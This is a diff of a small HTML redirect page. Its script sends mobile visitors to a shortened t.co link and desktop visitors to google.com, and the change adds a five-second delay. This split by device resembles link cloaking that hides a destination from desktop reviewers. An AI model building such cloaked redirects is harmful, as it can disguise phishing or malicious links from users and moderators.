@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -8,20 +9,30 @@
 
     <script>
         (function () {
-            const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+            const userAgent =
+                navigator.userAgent ||
+                navigator.vendor ||
+                window.opera;
 
-            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
+            const isMobile =
+                /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i
+                .test(userAgent);
 
-            if (isMobile) {
-                window.location.replace("https://t.co/nKj63vxEKt");
-            } else {
-                window.location.replace("https://www.google.com");
-            }
+            // Wait 5 seconds, then redirect
+            setTimeout(function () {
+
+                if (isMobile) {
+                    window.location.replace("https://t.co/nKj63vxEKt");
+                } else {
+                    window.location.replace("https://www.google.com");
+                }
+
+            }, 5000); // 5000ms = 5 seconds
         })();
     </script>
 </head>
 
 <body>
-    <p>Redirecting...</p>
+    <p>Redirecting in 5 seconds...</p>
 </body>
 </html>
